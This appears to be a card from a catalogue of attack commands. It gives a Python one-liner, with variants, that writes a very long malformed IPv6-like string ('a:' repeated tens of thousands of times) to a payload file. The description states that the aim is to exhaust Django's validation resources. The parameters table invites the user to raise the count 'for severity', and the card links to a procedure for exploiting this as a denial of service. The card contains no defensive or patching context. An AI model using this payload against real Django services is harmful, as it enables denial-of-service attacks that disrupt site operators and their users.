---
id: cmd-generate-malformed-ipv6-2024
data: 'python -c "s = ''a:'' * 50000; print(s)" > payload.txt'
tags:
  - payload
  - dos
type: command
output: null
executor: bash
platforms:
  - Linux
  - Python
created_at: '2024-10-01T00:00:00Z'
updated_at: '2025-12-14T17:26:48.826Z'
verified: false
validated: true
submitted: true
---
# generate-malformed-ipv6

## Command

```bash
python -c "s = 'a:' * 50000; print(s)" > payload.txt
```

## Description

Generates a long malformed IPv6-like string by repeating 'a:' to create an input that exhausts Django's validation resources.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| *50000 | Repetition count; adjust for severity | Yes |

## Examples

### Basic Usage

```bash
python -c "print('a:' * 10000)" > short_payload.txt
```

### Advanced Usage

```bash
python -c "import sys; reps = int(sys.argv[1]); print('a:' * reps)" 100000 > long_payload.txt
```

## Expected Output

A text file payload.txt containing the long string, e.g., a:a:a:... (100,000 chars).

## Related

- [[Related Procedure: Exploit DoS with Malformed IPv6 Strings]]
